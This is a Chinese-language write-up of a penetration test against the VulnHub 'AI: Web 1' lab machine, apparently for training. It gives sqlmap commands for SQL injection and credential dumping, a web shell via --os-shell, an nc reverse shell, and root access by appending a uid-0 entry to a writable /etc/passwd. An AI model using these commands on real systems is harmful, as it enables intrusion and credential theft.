AI Web1.0靶机渗透
2022-06-13 20:29:24

1.靶机介绍

靶机下载地址：https://www.vulnhub.com/entry/ai-web-1,353/
靶机介绍：
Description
Difficulty: Intermediate
Network: DHCP (Automatically assign)
Network Mode: NAT
This box is designed to test skills of penetration tester. The goal is simple. Get flag from /root/flag.txt. Enumerate the box, get low privileged shell and then escalate privilege to root。
靶机地址：10.8.0.104

2.端口扫描

扫描靶机信息，只开放了80端口

3.WEB访问

访问web，就这么一个页面，什么信息都没有

4.目录扫描

目录扫描，只有一个robots.txt有用
访问robots.txt，两个目录都无法访问
对/m3diNf0/进行目录扫描，只扫到一个info.php
访问/se3reTdir777/

5.SQL注入

尝试查询1为管理员，10没有结果，可能存在sql注入

sqlmap -u "http://10.8.0.104/se3reTdir777/#" --forms测试一下，发现确实存在sql注入
查看sqlmap运行时的POST data，构造--data参数
sqlmap -u "http://10.8.0.104/se3reTdir777/#" --data "uid=User%20ID&Operation=Submit" --dbs，查询到2个数据库，aiweb1和information_schema
sqlmap -u "http://10.8.0.104/se3reTdir777/#" --data "uid=User%20ID&Operation=Submit" -D aiweb1 --tables得到user和systemUser。
sqlmap -u "http://10.8.0.104/se3reTdir777/#" --data "uid=User%20ID&Operation=Submit" -D aiweb1 -T user --dump，直接爆数据，其实这个在网页测试的时候就已经给出了结果。。。
Admin：admin
Root：root
Mysql：mysql

sqlmap -u "http://10.8.0.104/se3reTdir777/#" --data "uid=User%20ID&Operation=Submit" -D aiweb1 -T systemUser --dump查询另外一个表，应该是系统的
t00r：RmFrZVVzZXJQYXNzdzByZA==
aiweb1pwn：TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ==
u3er：TjB0VGhpczBuZUFsczA=

将得到的密码破解后得到3组用户名和密码：
t00r：FakeUserPassw0rd
aiweb1pwn：MyEvilPass_f908sdaf9_sadfasf0sa
u3er：N0tThis0neAls0


6.sqlmap注入os-shell

得到了用户密码，但是没有登录页面，靶机也只开放了80端口，只能想办法拿到一个shell了，查看下/m3diNf0/info.php，尝试能否写入一个shell
sqlmap -u "http://10.8.0.104/se3reTdir777/#" --data "uid=User%20ID&Operation=Submit" --os-shell尝试写入shell，选择php，然后选择位置方式，使用网页的绝对路径无法写入
想到robots.txt提示的/se3reTdir777/uploads/虽然无法访问，猜测可能会具有写入权限，/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/使用这个目录，成功得到shell
查看一下，具有的是www-data权限，这个shell不太友好，尝试利用nc反弹shell未成功，查看下当前文件，看是否能写入反弹shell

7.文件上传反弹shell

查看/se3reTdir777/uploads/tmpuusrm.php时发现是个文件上传，上传个nc反弹shell的文件
本机开启监听，访问上传文件，成功反弹shell

8.提权

python -c 'import pty;pty.spawn("/bin/bash")'升级下shell，习惯性看下/etc/passwd的权限，居然属于www-data用户，那就可以尝试写入一个root权限的用户

perl -le 'print crypt("test","test")'先生成toor密码的密文teH0wLIpW0gyQ。
echo toor:teH0wLIpW0gyQ:0:0:root:/root:/bin/bash >>/etc/passwd写入密码，查看一下，成功写入，同时也看到还有2个用户aiweb1和aiweb1pwn，其中aiweb1pwn用户之前已经拿到了密码。
切换写入的toor用户，输入密码test，成功得到root权限，拿到flag!
